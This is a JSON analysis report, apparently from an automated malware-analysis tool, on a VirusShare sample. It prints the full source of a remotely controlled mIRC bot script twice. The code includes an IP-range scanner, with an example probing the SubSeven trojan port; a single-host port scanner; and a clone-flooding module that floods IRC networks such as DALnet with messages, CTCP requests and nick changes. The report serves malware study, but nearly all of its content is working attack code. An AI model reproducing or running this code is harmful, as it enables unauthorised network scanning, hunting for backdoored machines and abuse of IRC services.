{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "chr": "May attempt to obfuscate specific str",
            "kill": "May delete a file"
        },
        "macro": "ctcp 700:!version:*: { notice $nick %quit }\non *:QUIT: ruser $nick | if ($nick = %scan.nick) { .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }\non *:NICK: ruser $nick | if ($nick = %scan.nick) { set %scan.nick $newnick | .msg %scan.nick Scanned nickname now changed to %scan.nick ;) | halt }\non 700:TEXT:!scanStatus:*: {\n  if (%scan.nick != $null) { .msg $nick I'm Scanning Rang \u0002 $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 \u0002To\u0002 %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+ \u0002 I am Currently at \u0002 $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+ \u0002 Scanning Port \u0002 $+ %scan.port $+ \u0002 at a Delay Rate of \u0002 $+ $duration(%scan.delay) }\n  else { .msg $nick No Scans In Progress }\n}\non 700:TEXT:!scanAbort:*: {\n  if ($nick = %scan.nick) { .msg $nick you have just aborted the scanning of port \u0002 $+ %scan.port $+ \u0002 | .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }\n  else { .msg $nick Sorry but your not the user that started the scan so you cannot be the user to Abort the Scan | halt }\n}\non 700:TEXT:!scan *:*: {\n  if (%scan.nick != $null) { .msg $nick I'm Allready Scanning Rang \u0002 $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 \u0002To\u0002 %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+ \u0002 I am Currently at \u0002 $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+ \u0002 Scanning Port \u0002 $+ %scan.port $+ \u0002 at a Delay Rate of \u0002 $+ $duration(%scan.delay) | halt }\n  if ($remove($2,$chr(46)) !isnum) || ($remove($3,$chr(46)) !isnum) || ($remove($4,$chr(44)) !isnum) || ($5 !isnum) { .msg $nick Syntax: please Type !scan <starting ip> <ending ip> <port> <delay> \u0002\u001fEX\u001f !scan 24.24.24.1 24.24.24.255 27374 5\u0002 | halt }\n  else {\n    set %scan.Start1 $gettok($2,1,46)\n    set %scan.Start2 $gettok($2,2,46)\n    set %scan.Start3 $gettok($2,3,46)\n    set %scan.Start4 $gettok($2,4,46)\n    set %scan.Perm1 $gettok($2,1,46)\n    set %scan.Perm2 $gettok($2,2,46)\n    set %scan.Perm3 $gettok($2,3,46)\n    set %scan.Perm4 $gettok($2,4,46)\n    set %scan.End1 $gettok($3,1,46)\n    set %scan.End2 $gettok($3,2,46)\n    set %scan.End3 $gettok($3,3,46)\n    set %scan.End4 $gettok($3,4,46)\n    if (%scan.start1 > 255) || (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) || (%scan.end1 > 255) || (%scan.end2 > 255) || (%scan.end3 > 255) || (%scan.end4 > 255) { .msg $nick Sorry but you entered a digit Out Of Range | unset %scan.* | halt }\n    if (%scan.start1 > %scan.end1) || (%scan.start2 > %scan.end2) || (%scan.start3 > %scan.end3) || (%scan.start4 > %scan.end4) { .msg $nick Error Starting scan, your ending Ip is greater then your Starting ip | unset %scan.* | halt }\n    set %scan.port $4\n    set %scan.delay $5\n    set %scan.nick $nick\n    .timerscan 0 %scan.delay scancheck\n    .msg %scan.nick now Scanning Rang \u0002 $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 \u0002To\u0002 %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+ \u0002 I am Currently at \u0002 $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+ \u0002 Scanning Port \u0002 $+ %scan.port $+ \u0002 at a Delay Rate of \u0002 $+ $duration(%scan.delay)\n  }\n}\nalias portscan {\n  .sockopen port $+ %port.start $+ $chr(46) $+ %port.address %port.address %port.start\n  inc %port.start 1\n  if (%port.start >= %port.end) { .msg %port.nick Scanning of Ports has completed, now waiting for all ports to close | .timerport off | .timerportsock 0 5 portsock | halt }\n}\nalias portsock {\n  if ($sock(port*,0) = 0) {\n    .msg %port.nick scanning has now completed and all sockets have closed, you may now use port scan again\n    unset %port.*\n    .timerportsock off\n  }\n}\non *:SOCKOPEN:port*: {\n  if ($sockerr > 0) { .sockclose $sockname | halt }\n  .msg %port.nick \u0002Address:\u0002 $gettok($remove($sockname,port),2-,46) \u0002Port:\u0002 $gettok($remove($sockname,port),1,46)\n  .sockclose $sockname\n}\nalias scancheck {\n  if (%scan.start1 > 255) { .msg %scan.nick Scaning Has Completed | .msg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }\n  if (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) { .msg %scan.nick An Error Has Occured in the Scanning Proccess, Scan Aborted at %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 | unset %scan.* | .timerscan off | halt }\n  if ($count(%scan.port,$chr(44)) >= 1) {\n    set %scan.counter 0\n    set %scan.countport $count(%scan.port,$chr(44))\n    inc %scan.countport 1\n    :start\n    inc %scan.counter 1\n    .sockopen scan $+ $gettok(%scan.port,%scan.counter,44) $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $gettok(%scan.port,%scan.counter,44)\n    if (%scan.counter >= %scan.countport) { goto end }\n    else { goto start }\n  }\n  else { .sockopen scan $+ %scan.port $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.port }\n  :end\n  inc %scan.start4 1\n  if (%scan.start4 > %scan.end4) { set %scan.start4 %scan.perm4 | inc %scan.start3 }\n  if (%scan.start3 > %scan.end3) { set %scan.start3 %scan.perm3 | inc %scan.start2 }\n  if (%scan.start2 > %scan.end2) { set %scan.start2 %scan.perm2 | inc %scan.start1 }\n  if (%scan.start1 > %scan.end1) { .msg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }\n}\non 700:TEXT:!portstatus:*: { if (%port.nick = $null) { msg $nick I am currently Not scanning any ports }\n  elseif (%port.nick != $null) { .msg $nick I am currently scanning\u0002 %port.address \u0002 on ports\u0002 %port.perm \u0002to\u0002 %port.end \u0002 i'm currently at\u0002 %port.start \u0002its estimated another\u0002 $duration($calc($iif(%port.delay > 0,%port.delay) $iif(%port.delay > 0,*) $calc(%port.end - %port.start) + 5)) \u0002before i'm done\n  }\n}\non 700:TEXT:!portabort:*: { if ($nick = %port.nick) { .msg $nick i have aborted port scan | .timerport off | .timerportsock off | unset %port.* | halt } }\non 700:TEXT:!portscan *:*: {\n  if ($4 = $null) { msg $nick Error Entering Data use \u0002!portscan <ip> <Starting Port> <Ending Port> <delay>\u0002 \u001fEX\u001f !portscan 24.24.24.42 1 9000 5 | halt }\n  if (%port.nick != $null) { .msg $nick Sorry but i am allready Scanning \u0002 $+ %port.perm $+ \u0002 to \u0002 $+ %port.end $+ \u0002 on \u0002 $+ %port.address $+ \u0002 | halt }\n  if ($remove($2,$chr(46)) !isnum) || ($3 !isnum) || ($4 !isnum) || ($5 !isnum) { .msg msg $nick Error Entering Data use \u0002!portscan <ip> <Starting Port> <Ending Port> <delay>\u0002 \u001fEX\u001f !portscan 24.24.24.42 1 9000 1 | halt }\n  if ($4 < $3) { .msg $nick Error Starting Port Can't be greater then ending port | halt }\n  set %port.address $2\n  set %port.start $3\n  set %port.end $4\n  set %port.perm $3\n  set %port.delay $5\n  set %port.nick $nick\n  .timerport 0 %port.delay portscan\n  .msg %port.nick now scanning \u0002 $+ %port.address $+ \u0002 on Ports\u0002 %port.start \u0002to\u0002 %port.end \u0002with a delay of\u0002 %port.delay \u0002 estimated time to finish,\u0002 $duration($calc($iif(%port.delay > 0,%port.delay) $iif(%port.delay > 0,*) $calc(%port.end - %port.start) + 5))\n}\nalias clone {\n  if ($1 == in) {  if ($2 == PING) {  sockwrite -tn $sockname PONG $3  }  }\n  if ($1 == quit) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* quit : $+ $2- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* quit : $+ $2- }  }\n  if ($1 == msg) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* privmsg $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* privmsg $2 : $+ $3- }  }\n  if ($1 == notice) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* notice $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* notice $2 : $+ $3- }  }\n  if ($1 == all) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* PRIVMSG $2 :\u0001TIME\u0001 | sockwrite -tn clone* PRIVMSG $2 :\u0001PING\u0001 | sockwrite -tn clone* PRIVMSG $2 :\u0001VERSION\u0001  } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* PRIVMSG $2 :\u0001TIME\u0001 | sockwrite -tn sock* PRIVMSG $2 :\u0001PING\u0001 | sockwrite -tn sock* PRIVMSG $2 :\u0001VERSION\u0001 }  }\n  if ($1 == time) { if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :\u0001TIME\u0001 } | if ($sock(sock*,0) > 0) {    .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :\u0001TIME\u0001 } }\n  if ($1 == ping) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {     .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :\u0001PING\u0001 } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :\u0001PING\u0001 }  }\n  if ($1 == version) {  if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :\u0001VERSION\u0001 } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :\u0001VERSION\u0001 } }\n  if ($1 == join) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* join $2 } |  if ($sock(sock*,0) > 0) {   sockwrite -tn sock* join $2 } }\n  if ($1 == part) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  /sockwrite -n clone* part $2 : $+ $3- }  if ($sock(sock*,0) > 0) {  /sockwrite -n sock* part $2 : $+ $3- }  }\n  if ($1 == kill) {  if ($sock(clone*,0) > 0) {      sockclose clone* } |  if ($sock(sock*,0) > 0) {  sockclose sock* } }\n  if ($1 == connect) {  if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($4 == $null) { halt } |  set %clone.server $2 | set %clone.port $3 | set %clone.load $4 |  :loop |  if (%clone.load == 0) { halt } |  if ($sock(clone*,0) >= %max.load) || (%max.load == $null) { halt } |  //identd on $read verdana.exe | sockopen clone $+ $randomgen($r(0,9)) $2 $3 |  dec %clone.load 1 |   goto loop  } \n  if ($1 == arabchat) {  if ($2 == $null) { halt } | set %clone.server $gettok(kuwaitna@Khiran@UAE@ArabGate@Q8@Bahrain@Empire@kuwait@KSA@Gulf@Qatar@Doha@irc@, $+ $rand(1,13) $+ ,64) $+ .arabchat.org | set %clone.port $2 | set %clone.load $3 |  :loop |  if (%clone.load == 0) { halt } |  if ($sock(clone*,0) >= %max.load) || (%max.load == $null) { halt } |  //identd on $read verdana.exe | sockopen clone $+ $randomgen($r(0,9)) %clone.server $2 |  dec %clone.load 1 |   goto loop  } \n  if ($1 == dalnet) {  if ($2 == $null) { halt } | set %clone.server $gettok(toronto@brian@arcor@borg@ced@gaston@valhall@omen@powertech@zone@fork@spork@astro@coins@wombat@jade@liberty@dragons@nexgo@sniper@irc@twisted@, $+ $rand(1,22) $+ ,64) $+ .dal.net | set %clone.port $2 | set %clone.load $3 |  :loop |  if (%clone.load == 0) { halt } |  if ($sock(clone*,0) >= %max.load) || (%max.load == $null) { halt } |  //identd on $read verdana.exe | sockopen clone $+ $randomgen($r(0,9)) %clone.server $2 |  dec %clone.load 1 |   goto loop  } \n  if ($1 == nick.change) {  %.nc = 1  |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end } |  sockwrite -n $sock(clone*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |   :end  |   /wnickchn |   halt  }\nif ($1 == nick.this) {  %.nc = 1 |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end }  |   sockwrite -n $sock(clone*,%.nc) Nick $2 $+ $r(1,999) $+ $r(a,z) |   inc %.nc |  goto ncloop |   :end  |  /wnickchn2 $2 |  halt  } }"
    },
    "filename": "VirusShare_90a6221941fef63e2edc80990a2cb2c7",
    "filesize": 11915,
    "filetype": "data",
    "hashes": {
        "md5": "90a6221941fef63e2edc80990a2cb2c7",
        "sha1": "03491b3596e8978a1732b6e2c9668967df45daf2",
        "sha256": "7012936998fb168b5a4b00ea398daf45dc27e6ff378110d2d0cd379960fea84b"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "ctcp 700:!version:*: { notice $nick %quit }",
            "on *:QUIT: ruser $nick | if ($nick = %scan.nick) { .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }",
            "on *:NICK: ruser $nick | if ($nick = %scan.nick) { set %scan.nick $newnick | .msg %scan.nick Scanned nickname now changed to %scan.nick ;) | halt }",
            "on 700:TEXT:!scanStatus:*: {",
            "  if (%scan.nick != $null) { .msg $nick I'm Scanning Rang ",
            " $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 ",
            " %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+ ",
            " I am Currently at ",
            " $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+ ",
            " Scanning Port ",
            " $+ %scan.port $+ ",
            " at a Delay Rate of ",
            " $+ $duration(%scan.delay) }",
            "  else { .msg $nick No Scans In Progress }",
            "on 700:TEXT:!scanAbort:*: {",
            "  if ($nick = %scan.nick) { .msg $nick you have just aborted the scanning of port ",
            " $+ %scan.port $+ ",
            " | .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }",
            "  else { .msg $nick Sorry but your not the user that started the scan so you cannot be the user to Abort the Scan | halt }",
            "on 700:TEXT:!scan *:*: {",
            "  if (%scan.nick != $null) { .msg $nick I'm Allready Scanning Rang ",
            " $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 ",
            " %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+ ",
            " I am Currently at ",
            " $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+ ",
            " Scanning Port ",
            " $+ %scan.port $+ ",
            " at a Delay Rate of ",
            " $+ $duration(%scan.delay) | halt }",
            "  if ($remove($2,$chr(46)) !isnum) || ($remove($3,$chr(46)) !isnum) || ($remove($4,$chr(44)) !isnum) || ($5 !isnum) { .msg $nick Syntax: please Type !scan <starting ip> <ending ip> <port> <delay> ",
            " !scan 24.24.24.1 24.24.24.255 27374 5",
            " | halt }",
            "  else {",
            "    set %scan.Start1 $gettok($2,1,46)",
            "    set %scan.Start2 $gettok($2,2,46)",
            "    set %scan.Start3 $gettok($2,3,46)",
            "    set %scan.Start4 $gettok($2,4,46)",
            "    set %scan.Perm1 $gettok($2,1,46)",
            "    set %scan.Perm2 $gettok($2,2,46)",
            "    set %scan.Perm3 $gettok($2,3,46)",
            "    set %scan.Perm4 $gettok($2,4,46)",
            "    set %scan.End1 $gettok($3,1,46)",
            "    set %scan.End2 $gettok($3,2,46)",
            "    set %scan.End3 $gettok($3,3,46)",
            "    set %scan.End4 $gettok($3,4,46)",
            "    if (%scan.start1 > 255) || (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) || (%scan.end1 > 255) || (%scan.end2 > 255) || (%scan.end3 > 255) || (%scan.end4 > 255) { .msg $nick Sorry but you entered a digit Out Of Range | unset %scan.* | halt }",
            "    if (%scan.start1 > %scan.end1) || (%scan.start2 > %scan.end2) || (%scan.start3 > %scan.end3) || (%scan.start4 > %scan.end4) { .msg $nick Error Starting scan, your ending Ip is greater then your Starting ip | unset %scan.* | halt }",
            "    set %scan.port $4",
            "    set %scan.delay $5",
            "    set %scan.nick $nick",
            "    .timerscan 0 %scan.delay scancheck",
            "    .msg %scan.nick now Scanning Rang ",
            " $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 ",
            " %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+ ",
            " I am Currently at ",
            " $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+ ",
            " Scanning Port ",
            " $+ %scan.port $+ ",
            " at a Delay Rate of ",
            " $+ $duration(%scan.delay)",
            "alias portscan {",
            "  .sockopen port $+ %port.start $+ $chr(46) $+ %port.address %port.address %port.start",
            "  inc %port.start 1",
            "  if (%port.start >= %port.end) { .msg %port.nick Scanning of Ports has completed, now waiting for all ports to close | .timerport off | .timerportsock 0 5 portsock | halt }",
            "alias portsock {",
            "  if ($sock(port*,0) = 0) {",
            "    .msg %port.nick scanning has now completed and all sockets have closed, you may now use port scan again",
            "    unset %port.*",
            "    .timerportsock off",
            "on *:SOCKOPEN:port*: {",
            "  if ($sockerr > 0) { .sockclose $sockname | halt }",
            "  .msg %port.nick ",
            "Address:",
            " $gettok($remove($sockname,port),2-,46) ",
            "Port:",
            " $gettok($remove($sockname,port),1,46)",
            "  .sockclose $sockname",
            "alias scancheck {",
            "  if (%scan.start1 > 255) { .msg %scan.nick Scaning Has Completed | .msg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }",
            "  if (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) { .msg %scan.nick An Error Has Occured in the Scanning Proccess, Scan Aborted at %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 | unset %scan.* | .timerscan off | halt }",
            "  if ($count(%scan.port,$chr(44)) >= 1) {",
            "    set %scan.counter 0",
            "    set %scan.countport $count(%scan.port,$chr(44))",
            "    inc %scan.countport 1",
            "    :start",
            "    inc %scan.counter 1",
            "    .sockopen scan $+ $gettok(%scan.port,%scan.counter,44) $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $gettok(%scan.port,%scan.counter,44)",
            "    if (%scan.counter >= %scan.countport) { goto end }",
            "    else { goto start }",
            "  else { .sockopen scan $+ %scan.port $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.port }",
            "  :end",
            "  inc %scan.start4 1",
            "  if (%scan.start4 > %scan.end4) { set %scan.start4 %scan.perm4 | inc %scan.start3 }",
            "  if (%scan.start3 > %scan.end3) { set %scan.start3 %scan.perm3 | inc %scan.start2 }",
            "  if (%scan.start2 > %scan.end2) { set %scan.start2 %scan.perm2 | inc %scan.start1 }",
            "  if (%scan.start1 > %scan.end1) { .msg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }",
            "on 700:TEXT:!portstatus:*: { if (%port.nick = $null) { msg $nick I am currently Not scanning any ports }",
            "  elseif (%port.nick != $null) { .msg $nick I am currently scanning",
            " %port.address ",
            " on ports",
            " %port.perm ",
            " %port.end ",
            " i'm currently at",
            " %port.start ",
            "its estimated another",
            " $duration($calc($iif(%port.delay > 0,%port.delay) $iif(%port.delay > 0,*) $calc(%port.end - %port.start) + 5)) ",
            "before i'm done",
            "on 700:TEXT:!portabort:*: { if ($nick = %port.nick) { .msg $nick i have aborted port scan | .timerport off | .timerportsock off | unset %port.* | halt } }",
            "on 700:TEXT:!portscan *:*: {",
            "  if ($4 = $null) { msg $nick Error Entering Data use ",
            "!portscan <ip> <Starting Port> <Ending Port> <delay>",
            " !portscan 24.24.24.42 1 9000 5 | halt }",
            "  if (%port.nick != $null) { .msg $nick Sorry but i am allready Scanning ",
            " $+ %port.perm $+ ",
            " to ",
            " $+ %port.end $+ ",
            " on ",
            " $+ %port.address $+ ",
            " | halt }",
            "  if ($remove($2,$chr(46)) !isnum) || ($3 !isnum) || ($4 !isnum) || ($5 !isnum) { .msg msg $nick Error Entering Data use ",
            "!portscan <ip> <Starting Port> <Ending Port> <delay>",
            " !portscan 24.24.24.42 1 9000 1 | halt }",
            "  if ($4 < $3) { .msg $nick Error Starting Port Can't be greater then ending port | halt }",
            "  set %port.address $2",
            "  set %port.start $3",
            "  set %port.end $4",
            "  set %port.perm $3",
            "  set %port.delay $5",
            "  set %port.nick $nick",
            "  .timerport 0 %port.delay portscan",
            "  .msg %port.nick now scanning ",
            " $+ %port.address $+ ",
            " on Ports",
            " %port.start ",
            " %port.end ",
            "with a delay of",
            " %port.delay ",
            " estimated time to finish,",
            " $duration($calc($iif(%port.delay > 0,%port.delay) $iif(%port.delay > 0,*) $calc(%port.end - %port.start) + 5))",
            "alias clone {",
            "  if ($1 == in) {  if ($2 == PING) {  sockwrite -tn $sockname PONG $3  }  }",
            "  if ($1 == quit) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* quit : $+ $2- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* quit : $+ $2- }  }",
            "  if ($1 == msg) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* privmsg $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* privmsg $2 : $+ $3- }  }",
            "  if ($1 == notice) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* notice $2 : $+ $3- } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* notice $2 : $+ $3- }  }",
            "  if ($1 == all) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* PRIVMSG $2 :",
            "TIME",
            " | sockwrite -tn clone* PRIVMSG $2 :",
            "PING",
            " | sockwrite -tn clone* PRIVMSG $2 :",
            "VERSION",
            "  } |  if ($sock(sock*,0) > 0) { sockwrite -tn sock* PRIVMSG $2 :",
            "TIME",
            " | sockwrite -tn sock* PRIVMSG $2 :",
            "PING",
            " | sockwrite -tn sock* PRIVMSG $2 :",
            "VERSION",
            " }  }",
            "  if ($1 == time) { if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :",
            "TIME",
            " } | if ($sock(sock*,0) > 0) {    .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :",
            "TIME",
            " } }",
            "  if ($1 == ping) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {     .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :",
            "PING",
            " } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :",
            "PING",
            " }  }",
            "  if ($1 == version) {  if ($2 == $null) { halt } | if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $2 :",
            "VERSION",
            " } |  if ($sock(sock*,0) > 0) {   .timer 2 1 sockwrite -tn sock* PRIVMSG $2 :",
            "VERSION",
            " } }",
            "  if ($1 == join) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* join $2 } |  if ($sock(sock*,0) > 0) {   sockwrite -tn sock* join $2 } }",
            "  if ($1 == part) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  /sockwrite -n clone* part $2 : $+ $3- }  if ($sock(sock*,0) > 0) {  /sockwrite -n sock* part $2 : $+ $3- }  }",
            "  if ($1 == kill) {  if ($sock(clone*,0) > 0) {      sockclose clone* } |  if ($sock(sock*,0) > 0) {  sockclose sock* } }",
            "  if ($1 == connect) {  if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($4 == $null) { halt } |  set %clone.server $2 | set %clone.port $3 | set %clone.load $4 |  :loop |  if (%clone.load == 0) { halt } |  if ($sock(clone*,0) >= %max.load) || (%max.load == $null) { halt } |  //identd on $read verdana.exe | sockopen clone $+ $randomgen($r(0,9)) $2 $3 |  dec %clone.load 1 |   goto loop  } ",
            "  if ($1 == arabchat) {  if ($2 == $null) { halt } | set %clone.server $gettok(kuwaitna@Khiran@UAE@ArabGate@Q8@Bahrain@Empire@kuwait@KSA@Gulf@Qatar@Doha@irc@, $+ $rand(1,13) $+ ,64) $+ .arabchat.org | set %clone.port $2 | set %clone.load $3 |  :loop |  if (%clone.load == 0) { halt } |  if ($sock(clone*,0) >= %max.load) || (%max.load == $null) { halt } |  //identd on $read verdana.exe | sockopen clone $+ $randomgen($r(0,9)) %clone.server $2 |  dec %clone.load 1 |   goto loop  } ",
            "  if ($1 == dalnet) {  if ($2 == $null) { halt } | set %clone.server $gettok(toronto@brian@arcor@borg@ced@gaston@valhall@omen@powertech@zone@fork@spork@astro@coins@wombat@jade@liberty@dragons@nexgo@sniper@irc@twisted@, $+ $rand(1,22) $+ ,64) $+ .dal.net | set %clone.port $2 | set %clone.load $3 |  :loop |  if (%clone.load == 0) { halt } |  if ($sock(clone*,0) >= %max.load) || (%max.load == $null) { halt } |  //identd on $read verdana.exe | sockopen clone $+ $randomgen($r(0,9)) %clone.server $2 |  dec %clone.load 1 |   goto loop  } ",
            "  if ($1 == nick.change) {  %.nc = 1  |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end } |  sockwrite -n $sock(clone*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |   :end  |   /wnickchn |   halt  }",
            "if ($1 == nick.this) {  %.nc = 1 |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end }  |   sockwrite -n $sock(clone*,%.nc) Nick $2 $+ $r(1,999) $+ $r(a,z) |   inc %.nc |  goto ncloop |   :end  |  /wnickchn2 $2 |  halt  } }"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [
            "24.24.24.255",
            "24.24.24.1",
            "24.24.24.42"
        ],
        "url": []
    },
    "time": "0:00:00.363262",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
